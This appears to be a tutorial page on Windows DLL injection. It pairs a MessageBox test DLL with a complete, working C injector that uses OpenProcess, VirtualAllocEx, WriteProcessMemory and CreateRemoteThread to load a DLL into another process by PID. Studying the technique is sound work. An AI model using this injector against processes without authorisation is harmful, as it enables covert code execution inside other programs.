---
description: Injecting DLL into a Process
---

# DLL Injection

## Writing Our Own DLL

Okay first of all , to do a DLL injection , we need a DLL ofcourse, so we can either use tools like `msfvenom` to create a DLL or create our own DLL using visual studio.

In visual studio , to create a DLL , we first need to create a new project and then select (DLL) option

![image.png](<../../.gitbook/assets/image (17) (1) (1).png>)

after giving a name for the project , visual studio will create a file with basic DLL skeleton

<figure><img src="../../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>

great, now we are ready to start with our DLL code and according to the [microsoft page](https://learn.microsoft.com/en-us/troubleshoot/windows-client/setup-upgrade-and-drivers/dynamic-link-library#the-dll-entry-point) , this is how a minimal DLL blueprint looks like

<figure><img src="../../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>

According to microsoft, `DLL_PROCESS_ATTACH` case is triggered when any DLL is loaded

<figure><img src="../../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>

So whatever we need to run should be done in `DLL_PROCESS_ATTACH`, knowing this , we can update our code accordingly and for simplicity purpose , I would just run a basic `MessageBoxW` function. Here’s the updated code.

```c
#include "pch.h"

VOID attachment_issues() {
    MessageBoxW(NULL, L"DLL Attached !!", L"DLL Injection", MB_ICONEXCLAMATION);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        attachment_issues();
        break;
    case DLL_THREAD_ATTACH: break;
    case DLL_THREAD_DETACH: break;
    case DLL_PROCESS_DETACH: break;
        break;
    }
    return TRUE;
}
```

## Loading DLL into Local Process

ok this looks great, now we can build the solution and it will provide us with a DLL , to check if it worked correctly we can either use process hacker 2 to manually inject a DLL or use `rundll32` to run the main function in DLL , for that we can just type this in cmd.

```powershell
rundll32.exe susdll.dll,DllMain
```

And we will see the message box on screen, this means that our DLL does work correctly, you might see an error box later which can be ignored for now

<figure><img src="../../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>

time to inject this DLL into a process }:-]

Now just create another New project and then we will start coding our DLL Injection “malware”.

Okay so first of all , if we want to load a DLL into our process / code , we can use `LoadLibraryW` function to perform our task, Here’s a small code and the output that shows we loaded the DLL into our process.

<figure><img src="../../.gitbook/assets/image 5.png" alt=""><figcaption></figcaption></figure>

Since the `LoadLibraryW` function is something that loads a DLL into `CURRENT PROCESS` , we can’t run it directly as it will load the DLL into our process memory. In order to “Inject” a DLL , we need to load that DLL into another process memory which can be done by first getting the handle to the process using `OpenProcess` and then create a thread which will run the `LoadLibraryW` function in that process and for that we need to get the address of the `LoadLibraryW` function which is present in `kernel32.dll`

As with injection , the steps are similar to that of Remote Process Injection. So here’s a preview of the code (full code afterwards)

```c
BOOL InjectDll(...) {
  HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  HANDLE k32Handle = GetModuleHandleA("Kernel32.dll");
  PVOID fnLoadLibrary = GetProcAddress(k32Handle, "LoadLibraryW");
  PVOID pBuf = VirtualAllocEx(pHandle, pBuf, pSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	WriteProcessMemory(pHandle, pBuf, DllPath, pSize, &bWrote)
  HANDLE tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)fnLoadLibrary, pBuf, 0, &tid);
  WaitForSingleObject(tHandle, INFINITE);		
}
```

## Explanation

Alright, so as I said, we got the handle to the process first and then we try to find the address for the `LoadLibraryW` function which is present inside `kernel32.dll` so we first get a handle to that DLL using `GetModuleHandleA` and then find the address of the function using `GetProcAddress` , then we write the path to DLL into a memory space in that process, and then finally call the function with the DLL path as parameter.

Note that since the function is already executable and we are just allocating memory to write a parameter (DLL path), we don’t need to have `PAGE_EXECUTE_READWRITE` access since we wont be executing that part of memory either way. Ill show this later by updating the memory protection to `PAGE_READ` and we still would be able to load the DLL.

## Injecting DLL into a Remote Process

Here’s the full code

```c
#include <stdio.h>
#include <Windows.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define cool(msg, ...) printf("[>] " msg "\n", ##__VA_ARGS__)

BOOL InjexDll(LPCWSTR DllPath, DWORD pid, SIZE_T pSize) {
    
    DWORD   tid = 0;
    SIZE_T  bWrote = 0;
    PVOID   pBuf = NULL;
    PVOID   fnLoadLibrary = NULL;
    HANDLE  tHandle = NULL;
    HANDLE  pHandle = NULL;
    HMODULE k32Handle = NULL;

    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (pHandle == NULL) {
        warn("Failed to Open Process ; Got  @--0x%x", GetLastError());
        return FALSE;
    }
    info("Opened Handle to the process %d  @--0x%x", (int)pid, pHandle);

    k32Handle = GetModuleHandleA("Kernel32.dll");
    if (k32Handle == NULL) {
        warn("Failed to Load kernel32.dll ; Got  @--0x%x", GetLastError());
        return FALSE;
    }

    fnLoadLibrary = GetProcAddress(k32Handle, "LoadLibraryW");
    if (fnLoadLibrary == NULL) {
        warn("Failed to get LoadLibraryW address; Got  @--0x%x", GetLastError());
        return FALSE;
    }

    pBuf = VirtualAllocEx(pHandle, pBuf, pSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pBuf == NULL) {
        warn("Failed to Allocate Buffer on Process Memory; Got  @--0x%x", GetLastError());
        return FALSE;
    }

    if (!WriteProcessMemory(pHandle, pBuf, DllPath, pSize, &bWrote)) {
        warn("Failed to Write on Process Memory; Got  @--0x%x", GetLastError());
        return FALSE;
    }
    info("WriteProcessMemory Success!");

    if (!VirtualProtectEx(pHandle, pBuf, pSize, PAGE_READONLY, &bWrote)) {
        warn("Unable to Change Protection on Memory");
    }
    info("Updated Memory to READONLY");

    tHandle = CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)fnLoadLibrary, pBuf, 0, &tid);
    if (tHandle == NULL) {
        warn("CreateRemoteThread failed; Got  @--0x%x", GetLastError());
        return FALSE;
    }
    
    cool("Created a Remote Thread, DLL will be injected soon");
    WaitForSingleObject(tHandle, INFINITE);

    CloseHandle(tHandle); CloseHandle(pHandle); CloseHandle(k32Handle); VirtualFree(pBuf, 0, MEM_RELEASE);

    return TRUE;
}

VOID main(int argc, char* argv[]) {

    if (argc < 2) {
        info("Usage: %s <PID>", argv[0]);
        exit(0);
    }

    WCHAR DLLPath[] = L"D:\\Meoware\\susdll.dll";
    DWORD PID = atoi(argv[1]);
    InjexDll(DLLPath, PID, sizeof(DLLPath));
    
    return 0;
}
```

and after running this , we see the message box :)

<figure><img src="../../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>

Noiceee , that’s how we can simply inject our DLL into any process provided we have enough access.

### Debugging Errors

I also wanted to show how importante debugging is and this is why ill show something that I faced while writing this code. I accidentally typo-ed the `LoadLibraryW` function to `LoadLibaryW` which was the reason I wasn’t able to inject the DLL since there is no such function, and after some debugging, I got to see this

<figure><img src="../../.gitbook/assets/image 7.png" alt=""><figcaption></figcaption></figure>

Note that there wasn’t any typo in the print statement , but after searching for `0x7f` on the microsoft error page , we see `ERROR_PROC_NOT_FOUND`

<figure><img src="../../.gitbook/assets/image 8.png" alt=""><figcaption></figcaption></figure>

which is absolutely correct since `LoadLibaryW` (typoed) doesn’t exists, but we can also try googling the issue and find pages like [this ](https://stackoverflow.com/questions/7682732/getprocaddress-error-127-error-proc-not-found)and [this](https://forums.codeguru.com/showthread.php?292253-what-s-the-meaning-of-error-code-127-ERROR_PROC_NOT_FOUND) which further confirms what we saw. And so with good  debugging and googling skills, one can save their time and get to exactly know what is causing the issue.&#x20;

## References

* [https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
* [https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw)
* [https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection](https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection)
* [https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)

